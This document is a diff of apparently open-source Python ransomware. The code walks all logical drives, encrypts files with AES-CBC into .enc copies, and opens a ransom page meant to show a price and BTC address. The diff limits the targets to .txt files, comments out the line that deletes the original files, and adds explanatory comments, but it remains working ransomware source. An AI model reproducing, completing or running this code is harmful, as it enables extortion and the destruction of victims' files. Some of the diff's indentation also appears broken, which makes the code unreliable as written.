@@ -2,11 +2,11 @@
 import os, random, struct, hashlib, time, win32api, webbrowser
 from Crypto.Cipher import AES
 
-extensions = ['.mp3','.txt','.docx','.doc','.xlsx','.png','.jpg','jpeg']
+extensions = ['.txt'] # Test only with txt files, add more extensions at your own risk
 homedir = "C:\Users\Python\Desktop\Ransom\File"
 path = os.path.join(homedir, "firstdir")
-url = "https://github.com/luisxciv/SYrans"
-new = 2
+url = "https://github.com/luisxciv/SYrans" #Ransom page to display with price, BTC address etc...
+new = 2 # opens in new tab (if possible)
 
 def encryption(key):
     for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
@@ -18,19 +18,19 @@ def encryption(key):
                     print "[+] - Files found = [+]"
                     print in_filename
     
-                    #
+                    #Prints the files in the dir
                     print "[!] - Encrypting files..."
-                    #
+                    # Encrypts the file and adds .enc extension
                     encrypt(key,in_filename)
                     print "[+] - Files are now encrypted."
                     #
 
                     print "[!] - Deleting Original Files..."
-                    #
-                    os.remove(os.path.join(root, file))
+                # Uncomment the line below to remove the original files (If you don't know how to decrypt with python using AES 256-CBC then dont uncomment.
+                   # os.remove(os.path.join(root, file))
                     print "[+] - Original files deleted."
     
-                    
+                    #Proceeds to next dir
                     seconds = int(1)
                     print "[+] - Next encryption in %s second" %seconds
                     time.sleep(seconds)
@@ -38,6 +38,8 @@ def encryption(key):
 
     print "[+] - All files are now encrypted and replaced with a .enc file extension"
 
+
+#Encryption algorythm (AES-CBC 256)
 def encrypt(key, in_filename, out_filename=None, chunksize=64*1024):
     if not out_filename:
         out_filename = in_filename + '.enc'
